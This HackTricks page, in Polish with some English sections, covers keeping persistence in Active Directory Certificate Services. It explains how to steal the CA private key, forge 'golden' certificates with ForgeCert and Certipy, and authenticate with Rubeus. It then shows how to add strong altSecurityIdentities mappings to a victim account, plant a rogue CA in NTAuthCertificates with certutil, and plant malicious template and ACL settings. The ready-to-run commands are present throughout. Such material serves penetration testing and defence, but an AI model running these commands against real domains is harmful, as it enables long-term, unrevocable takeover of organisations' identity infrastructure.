# Utrwalanie w domenie AD CS

{{#include ../../../banners/hacktricks-training.md}}

**To jest podsumowanie technik utrwalania w domenie opisanych w [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Sprawdź tam więcej szczegółów.

## Fałszowanie certyfikatów przy użyciu skradzionych certyfikatów CA (Golden Certificate) - DPERSIST1

Jak rozpoznać, że certyfikat jest certyfikatem CA?

Można stwierdzić, że certyfikat jest certyfikatem CA, jeśli spełnionych jest kilka warunków:

- Certyfikat jest przechowywany na serwerze CA, a jego klucz prywatny jest zabezpieczony przez DPAPI maszyny lub przez hardware takie jak TPM/HSM, jeśli system operacyjny to obsługuje.
- Zarówno pola Issuer, jak i Subject certyfikatu odpowiadają distinguished name CA.
- W certyfikatach CA obecne jest rozszerzenie "CA Version" wyłącznie.
- Certyfikat nie posiada pól Extended Key Usage (EKU).

Aby wydobyć klucz prywatny tego certyfikatu, narzędzie certsrv.msc na serwerze CA jest wspieraną metodą przez wbudowane GUI. Niemniej jednak, ten certyfikat nie różni się od innych przechowywanych w systemie; w związku z tym można zastosować metody takie jak [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) do jego wydobycia.

Certyfikat i klucz prywatny można również uzyskać za pomocą Certipy przy użyciu następującego polecenia:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Po pozyskaniu certyfikatu CA i jego klucza prywatnego w formacie `.pfx`, narzędzia takie jak [ForgeCert](https://github.com/GhostPack/ForgeCert) mogą być użyte do wygenerowania ważnych certyfikatów:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Użytkownik, dla którego fałszuje się certyfikat, musi być aktywny i zdolny do uwierzytelniania w Active Directory, aby proces się powiódł. Fałszowanie certyfikatu dla kont specjalnych, takich jak krbtgt, jest nieskuteczne.

Ten sfałszowany certyfikat będzie **ważny** do wskazanej daty końcowej oraz tak długo, jak ważny jest certyfikat root CA (zwykle od 5 do **10+ lat**). Jest on również ważny dla **maszyn**, więc w połączeniu z **S4U2Self** atakujący może **utrzymać trwałość na dowolnej maszynie domenowej** tak długo, jak ważny jest certyfikat CA.\
Co więcej, **certyfikaty wygenerowane** tą metodą **nie mogą być odwołane**, ponieważ CA o nich nie wie.

### Działanie pod Strong Certificate Mapping Enforcement (2025+)

Od 11 lutego 2025 (po wdrożeniu KB5014754) kontrolery domeny domyślnie stosują **Full Enforcement** dla mapowań certyfikatów. W praktyce oznacza to, że twoje sfałszowane certyfikaty muszą albo:

- Zawierać silne powiązanie z kontem docelowym (na przykład SID security extension), lub
- Być sparowane ze silnym, jawnym mapowaniem na obiekcie docelowym w atrybucie `altSecurityIdentities`.

Sprawdzonym podejściem do utrzymania trwałości jest wygenerowanie sfałszowanego certyfikatu powiązanego ze skradzionym Enterprise CA, a następnie dodanie silnego, jawnego mapowania do principal ofiary:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See
[account-persistence](account-persistence.md) for more on explicit mappings.
- Revocation does not help defenders here: forged certificates are unknown to the CA database and thus cannot be revoked.

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ta możliwość jest szczególnie istotna, gdy jest używana wraz z wcześniej opisanym sposobem wykorzystującym ForgeCert do dynamicznego generowania certyfikatów.

> Uwagi dotyczące mapowania po 2025 roku: umieszczenie złośliwego CA w NTAuth powoduje jedynie ustanowienie zaufania do wystawiającego CA. Aby użyć certyfikatów końcowych do logowania, gdy DCs są w **Full Enforcement**, certyfikat końcowy musi albo zawierać rozszerzenie bezpieczeństwa SID, albo na docelowym obiekcie musi istnieć silne, jawne mapowanie (na przykład Issuer+Serial w `altSecurityIdentities`). Zobacz {{#ref}}account-persistence.md{{#endref}}.

## Złośliwa nieprawidłowa konfiguracja - DPERSIST3

Możliwości uzyskania **persistence** poprzez **security descriptor modifications of AD CS** komponentów jest wiele. Modyfikacje opisane w sekcji "[Domain Escalation](domain-escalation.md)" mogą być złośliwie wdrożone przez atakującego z podwyższonymi uprawnieniami. Obejmuje to dodanie "control rights" (np. WriteOwner/WriteDACL/itd.) do wrażliwych komponentów, takich jak:

- Obiekt **CA server’s AD computer**
- Serwer **CA server’s RPC/DCOM server**
- Dowolny **descendant AD object or container** w **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (na przykład kontener Certificate Templates, kontener Certification Authorities, obiekt NTAuthCertificates, itd.)
- AD grupy, którym domyślnie lub przez organizację przyznano prawa do kontrolowania AD CS (takie jak wbudowana grupa Cert Publishers i wszyscy jej członkowie)

Przykładem złośliwej implementacji byłoby dodanie przez atakującego, który ma **elevated permissions** w domenie, uprawnienia **`WriteOwner`** do domyślnego szablonu certyfikatu **`User`**, przy czym atakujący byłby podmiotem posiadającym to prawo. Aby to wykorzystać, atakujący najpierw zmieniłby właściciela szablonu **`User`** na siebie. Następnie **`mspki-certificate-name-flag`** zostałoby ustawione na **1** w szablonie, aby włączyć **`ENROLLEE_SUPPLIES_SUBJECT`**, co pozwoli użytkownikowi podać Subject Alternative Name w żądaniu. W rezultacie atakujący mógłby **enroll** używając **template**, wybierając nazwę **domain administrator** jako nazwę alternatywną i wykorzystać pozyskany certyfikat do uwierzytelnienia jako DA.

Praktyczne ustawienia, które atakujący mogą skonfigurować dla długoterminowego persistence w domenie (zobacz {{#ref}}domain-escalation.md{{#endref}} po pełne szczegóły i wykrywanie):

- Flagi polityki CA pozwalające na SAN od żądających (np. włączenie `EDITF_ATTRIBUTESUBJECTALTNAME2`). To utrzymuje ścieżki podobne do ESC1 podatne na wykorzystanie.
- DACL szablonu lub ustawienia umożliwiające wydawanie zdolne do uwierzytelniania (np. dodanie EKU Client Authentication, włączenie `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrolowanie obiektu `NTAuthCertificates` lub kontenerów CA w celu ciągłego ponownego wprowadzania złośliwych issuerów, jeśli obrońcy podejmą próbę sprzątania.

> [!TIP]
> W wzmocnionych środowiskach po KB5014754, sparowanie tych błędnych konfiguracji z wyraźnymi silnymi mapowaniami (`altSecurityIdentities`) zapewnia, że wydane lub sfałszowane certyfikaty pozostaną użyteczne nawet gdy DCs wymuszają silne mapowanie.

## Odniesienia

- Microsoft KB5014754 – Zmiany uwierzytelniania opartego na certyfikatach na kontrolerach domeny Windows (harmonogram egzekwowania i silne mapowania). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – odniesienie poleceń i użycie forge/auth. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
